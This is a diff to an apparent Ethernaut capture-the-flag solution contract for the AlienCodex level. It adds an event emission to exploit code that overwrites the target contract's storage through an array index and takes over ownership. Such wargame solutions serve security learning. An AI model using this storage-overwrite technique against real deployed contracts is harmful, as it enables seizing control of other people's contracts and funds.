@@ -39,6 +39,7 @@ contract AlienCodex is Ownable {
 }
 
 contract Solution19 {
+    event HackSucceeded(address addr);
     function hack(AlienCodex _hack) public {
         if (!_hack.contact()) {
             _hack.make_contact();
@@ -49,6 +50,7 @@ contract Solution19 {
             // Then we can use any index so that can modify any storage.
             _hack.revise(calcuHackIndex(), convertAddr(msg.sender));
             require(_hack.owner() == msg.sender, "Hack fails");
+            emit HackSucceeded(address(_hack));
         }
     }
 
